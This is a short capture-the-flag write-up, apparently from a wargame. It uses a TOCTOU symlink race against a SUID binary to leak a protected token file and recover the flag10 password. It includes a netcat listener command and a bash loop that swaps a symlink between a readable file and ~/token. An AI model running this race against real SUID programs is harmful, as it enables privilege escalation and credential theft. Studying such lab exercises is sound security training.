There are a binary file `level10` and `token` in the home directory. We can execute ./level10, however we have no access to `token` file.
`level10` has the SUID bit and is owned by flag10. The program needs a file path and a host as arguments. It's obvious that we have to pass token as parameter. But how ? 

- We disassemble the executable with Ghidra. The program checks if we have the read permission on the file given as parameter. Then if we do, it tries to connect to the host on the port `6969` and sends the contents of the file.
- We see a lot of things in the main function, but especially the function `access` which checks if we have the read permission (so even if we create a symbolic file, we won't able to give it token).
- We notice that there are a lot of instructions/operations between the access call and open.
- So, first we create a simple server with netcat : `nc -lk 6969 | grep -v [contentfile2] | grep -v '.*( )*.' `
  - flag k allows to keep running after EOF
  - first grep -v to exclude content of `filename2`
  - second grep -v to exclude the banner (`'.*( )*.'`)
- In a second shell we give to the program a symbolic link pointing to a file we have the read access on, and we change the file pointed during the program flow to token. In order to do that, we use that bash script :
 ```bash
while true; do
  ln -sf /tmp/[filename1] /tmp/[filename2]
  ./level10 /tmp/[filename2] 127.0.0.1 &
  ln -sf ~/token /tmp/[filename2]
done
```

Tada! We get the password of flag10 with the TOCTOU method! 
